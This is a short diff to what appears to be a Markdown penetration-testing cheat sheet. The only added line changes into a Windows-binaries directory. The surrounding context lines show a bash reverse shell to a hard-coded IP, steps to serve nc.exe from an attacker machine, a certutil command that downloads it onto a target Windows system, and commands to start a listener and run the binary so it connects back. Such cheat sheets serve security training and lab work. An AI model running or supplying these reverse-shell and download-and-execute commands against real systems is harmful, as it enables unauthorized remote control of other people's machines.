@@ -160,6 +160,7 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 __Download the reverse shell in windows__
   - > __First we need to host the file in your kali linux__
+    - __`cd /usr/share/windows-binaries/`__
     - __`python -m SimpleHTTPServer 80`__
   - > __Go to the target windows system type the below command in the `cmd`__
     - __`certutil -urlcache -f http://<attacker_ip>/nc.exe net.exe`__
@@ -167,6 +168,7 @@ __Download the reverse shell in windows__
     > __`nc -nvlp 1234`__
   - > __we need to run the file in target system__
     - __`new.exe -nv <attacker ip> 1234`__
+
 
 
 
